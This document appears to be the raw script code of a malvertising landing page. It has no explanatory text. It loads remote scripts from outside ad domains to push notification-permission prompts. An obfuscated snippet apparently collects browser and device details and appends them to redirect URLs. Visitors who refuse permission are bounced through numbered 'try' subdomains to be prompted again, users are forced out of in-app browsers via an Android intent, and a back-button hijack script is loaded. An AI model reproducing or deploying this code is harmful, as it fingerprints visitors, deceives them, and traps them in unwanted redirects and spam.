<script>
  var url = new URL(window.location.href);
  var pci = url.host.replace(/try\d+\./, '');
  var ppi = pci;

  console.log('Domain', pci);
  var trafficbackURL = "https://g0st.com/4/5478606/?var="+ppi+"&ymid="+pci;
</script>

<script>
  var a='mcrpolfattafloprcmlVeedrosmico?ncc=uca&FcusleluVlearVsyipoonrctannEdhrgoiiHdt_emgocdeellicboosmccoast_avDetrnseigoAnrcebsruocw=seelri_bvoemr_ssiiocn'.split('').reduce((m,c,i)=>i%2?m+c:c+m).split('c');var Replace=(o=>{var v=a[0];try{v+=a[1]+Boolean(navigator[a[2]][a[3]]);navigator[a[2]][a[4]](o[0]).then(r=>{o[0].forEach(k=>{v+=r[k]?a[5]+o[1][o[0].indexOf(k)]+a[6]+encodeURIComponent(r[k]):a[0]})})}catch(e){}return u=>window.location.replace([u,v].join(u.indexOf(a[7])>-1?a[5]:a[7]))})([[a[8],a[9],a[10],a[11]],[a[12],a[13],a[14],a[15]]]);
  var s = document.createElement('script');
  s.src='//10zon.com/225/2af90/mw.min.js?z=9569878'+'&ymid='+pci+'&var='+ppi+'&sw=/sw-check-permissions-73b04.js'+'&nouns=1';
  s.onload = function(result) {
      switch (result) {
          case 'onPermissionDefault':
          window.location.reload();break;
          case 'onPermissionAllowed':
          Replace(trafficbackURL);break;
          case 'onPermissionDenied':
          handleRedirect();break;
          case 'onAlreadySubscribed':
          Replace(trafficbackURL);break;
          case 'onNotificationUnsupported':
          Replace(trafficbackURL);break;
      }
  };
  document.head.appendChild(s);
</script>

<script>
  var Back_Button_Zone = 5478606;
  var Domain_TB = "rel-s.com";
</script>
<script async src="https://desenteir.com/225/2af90/reverse.min.js?sf=1"></script>

<script>
  function isInApp() {
      const regex = new RegExp(`(WebView|(iPhone|iPod|iPad)(?!.*Safari/)|Android.*(wv))`, 'ig');
      return Boolean(navigator.userAgent.match(regex));
  }
  
  function initInappRd() {
      var landingpageURL = window.location.hostname + window.location.pathname + window.location.search;
      var completeRedirectURL = 'intent://' + landingpageURL + '#Intent;scheme=https;package=com.android.chrome;end';
      var ua = navigator.userAgent.toLowerCase();
  
      if (isInApp() && (ua.indexOf('fb') !== -1 || ua.indexOf('android') !== -1 || ua.indexOf('wv') !== -1)) {
          document.body.addEventListener('click', function () {
              window.onbeforeunload = null;
              window.open(completeRedirectURL, '_system');
              setTimeout(function () {
                  window.location.replace(trafficbackURL);
              }, 1000);
          });
      }
  }
  
  if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', initInappRd);
  } else {
      initInappRd();
  }
</script>


<script>
  function handleRedirect() {
    const currentHost = window.location.hostname;
    // Extract base domain (main domain after subdomain)
    const domainParts = currentHost.split('.');
    const partsLength = domainParts.length;
    const part = partsLength >= 3 ? -3 : -2;
    // Handle cases like sub.sub.domain.com or domain.co.uk
    // We'll assume last two parts are the main domain (e.g. moneyfree.eu.org or google.com)
    const mainDomain = partsLength >= 3 ? domainParts.slice(part).join('.') : currentHost;
    const subPrefix = "try";
    // Regex to detect try[number].mainDomain
    const subdomainRegex = new RegExp(`^${subPrefix}(\\d+)\\.${mainDomain.replace('.', '\\.')}$`);
    const match = currentHost.match(subdomainRegex);
    if (match) {
      const currentNumber = parseInt(match[1], 10);
      const nextNumber = currentNumber + 1;
      // Optional limit
      if (nextNumber <= 10) {
        const nextHost = `${subPrefix}${nextNumber}.${mainDomain}`;
        window.location.href = `https://${nextHost}${window.location.pathname}${window.location.search}`;
      } else {
        console.warn("Max redirect level reached.");
        window.location.href = trafficbackURL;
      }
    } else {
      // If not in try[number] subdomain, redirect to try1
      const firstHost = `${subPrefix}1.${mainDomain}`;
      window.location.href = `https://${firstHost}${window.location.pathname}${window.location.search}`;
    }
  }
</script>
